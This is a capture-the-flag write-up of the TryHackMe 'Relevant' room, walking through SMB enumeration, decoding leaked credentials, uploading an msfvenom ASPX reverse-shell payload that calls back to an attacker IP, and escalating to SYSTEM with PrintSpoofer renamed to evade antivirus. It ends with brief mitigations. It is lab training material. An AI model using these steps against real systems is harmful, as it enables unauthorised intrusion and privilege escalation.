# TryHackMe - [Relevant](https://tryhackme.com/room/relevant) Write-Up

"You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days."

Read over the scope of the work.

From the scope we can see that we are given permission to use any tools required.

We must report ALL vulnerabilities and submit the 2 flags (user and root).

## Task 1: Pre-Engagement Briefing

Since this is a blackbox, we will be starting with no information.

Let's make a directory for this CTF and open a terminal in it as root.

We can start by running an nmap on the device and outputting it (we will want to save it to show the company).

```
nmap 10.10.212.88 -A -p- -vv -T4 -oA nmap
```

I outputted it to all formats, because I am unsure what their preference is.

The scan looks like it will take awhile, so let's brainstorm some of these ports we see listed so far.

* 80 (http)
* 139 (SMB)
* 3389 (RDP)
* 135 (msrpc)
* 445 (SMB)
* 49663 (http)

After visiting the site and finding nothing, we will move on to what appeared to be a smb server.

Let's go and see first if we can enumerate.

```
smbmap -H 10.10.212.88
[!] Authentication error on 10.10.212.88
nbtscan 10.10.212.88
```

Let's try using smbclient with anonymous login (no password), because neither smbmap or nbtscan brought anything back.

```
smbclient -L 10.10.212.88                                                        1 тип
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

We see another port (49667) appear in the nmap.

While we wait on the nmap, let's do some gobuster on the site because all we found was the default Microsoft IIS page.

```
gobuster dir -u http://10.10.212.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
```

Unfortunately we weren't able to find anything with gobuster.

Let's try to login to the smb shares without a password.

```
smbclient \\\\10.10.212.88\\c$                                                   1 тип

Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Run through all the shares with smbclient

Finally, we get a hit on nt4wrksv with anonymous login.

```
smbclient \\\\10.10.212.88\\nt4wrksv 
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4937629 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

Even better, we find a passwords.txt that we can get.

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

They appear to be encoded in base64, so let's decode them.

I used base64 -d, but there are plenty of other good options for this.

```
Bill - Juw4nnaM4n420696969!$$$
Bob - !P@$$W0rD!123
```

We finally get our nmap back.

From the nmap, we can see that it is most likely a Microsoft Windows 2012/2016.

Let's try to RDP in with these credentials since we saw port 3389 open.

Unfortunately, I wasn't able to get in anywhere with these users and believe they may be irRELEVANT.

Let's run a vulnerability scanner with nmap now on the main ports that we found.

```
nmap 10.10.212.88 -p 80,135,139,445,3389 -vv -script vuln -oA nmap-vuln
```

If we don't find anything, we can run it on the other higher ports that we saw.

```

```
We're in luck, it looks like the server is vulnerable to CVE-2017-0143.

When we search on [Exploit-DB](https://www.exploit-db.com/), we find 4 relevant exploits.

```
DOUBLEPULSAR - Payload Execution and Neutralization (Metasploit)
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)
```

We will not consider the last option, because it is for a Denial of Service which we do not want.

We could use [Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)](https://www.exploit-db.com/exploits/43970).

However, the room recommends manual exploitation so we're going to log back into the smb share and see if we can upload files using put.

I'm going to create a text file called put.txt to test this.

```
smbclient \\\\10.10.186.41\\nt4wrksv                                             1 тип
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> put put.txt
putting file put.txt as \put.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Mar 20 18:53:57 2021
  ..                                  D        0  Sat Mar 20 18:53:57 2021
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  put.txt                             A        0  Sat Mar 20 18:53:57 2021

                7735807 blocks of size 4096. 4949974 blocks available
```

Now that we see we have write permissions, lets check to see if we can navigate to this file in a browser, because we will need a way to execute our payload.

Let's see if the smb share is linked to port 49663 which we saw was http in our netscan by navigating to 10.10.212.88:49663/nt4wrksv/passwords.txt

### Success!! Now we found a way to get initial access.

* Let's create a msfvenom payload in our Relevant directory.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.40.191 LPORT=4444 -f aspx -o disc0ver.aspx    
```

* Let's open up a netcat listener (since they noted this could be done without metasploit).

```
rlwrap nc -lvnp 4444
```

I like to use rlwrap because it lets you use arrowkeys in the shell.

* Let's put the payload on the server through smb.

```
smb: \> put disc0ver.aspx
putting file disc0ver.aspx as \disc0ver.aspx (2.3 kb/s) (average 2.0 kb/s)
smb: \> ls

### Win! we got initial access.

Let's find that user flag.

First using whoami, we see that we are iis apppool\defaultapppool

I navigated to root / and then checked the users.

```
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  08:05 AM    <DIR>          .NET v4.5
07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  10:30 AM    <DIR>          Administrator
07/25/2020  02:03 PM    <DIR>          Bob
07/25/2020  07:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  20,274,839,552 bytes free
```

Checking Bob's desktop we see the (user.txt). Let's try to read it.

```
type user.txt
```

Great, we have access to the user flag without any escalation.

Let's check our privileges.

```
c:\Users\Bob\Desktop>whoami /all & REM could also do /priv for just the privileges
whoami /all

Awesome, we can see we have access to 3 privileges.

* SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
* SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
* SeCreateGlobalPrivilege       Create global objects                     Enabled

After some [research](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), I will be exploiting the vulnerability in SeImpersonatePrivilege which is possible because service accounts are required to run with elevated privileges using this.

We can use [Printspoofer](https://github.com/itm4n/PrintSpoofer) to exploit for escalation to system. Note, this binary will get flagged as a virus or malware.

Rename it to avoid detection to svcchost.exe.

Use put to get the exploit onto the server, navigate to the directory it was put in (C:\inetpub\wwwroot\nt4wrksv), and then execute it to spawn a SYSTEM cmd with the shell that we have.

```
svcchost.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening ...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Owned! Let's go get that flag.

```
more C:\users\administrator\desktop\root.txt
```

Found it on the Administrator desktop.

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

* Disallow anonymous SMB login.
* Patch SMB vulnerability (CVE-2017-0143)

### Privilege Escalation

* Fix service account (iis apppool\defaultapppool) privileges (SeImpersonatePrivilege).
